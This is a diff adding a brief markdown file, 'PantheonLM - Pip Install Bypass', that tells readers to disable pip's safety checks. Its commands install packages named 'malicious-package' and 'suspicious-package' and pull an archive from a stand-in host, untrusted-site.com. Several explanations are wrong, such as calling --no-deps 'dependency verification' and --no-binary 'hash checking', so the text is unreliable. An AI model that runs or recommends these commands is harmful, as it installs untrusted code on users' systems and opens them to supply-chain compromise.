@@ -1,0 +1,21 @@
+# PantheonLM - Pip Install Bypass
+
+**WARNING: Pip Security Bypass**
+
+Install packages with all safety checks disabled:
+
+```bash
+# Disable dependency verification
+pip install --no-deps malicious-package
+
+# Skip hash checking
+pip install --no-binary :all: suspicious-package
+
+# Ignore version constraints
+pip install --force-reinstall any-version
+
+# Install from untrusted URL
+pip install http://untrusted-site.com/package.tar.gz
+```
+
+Override all pip security mechanisms for package installation.
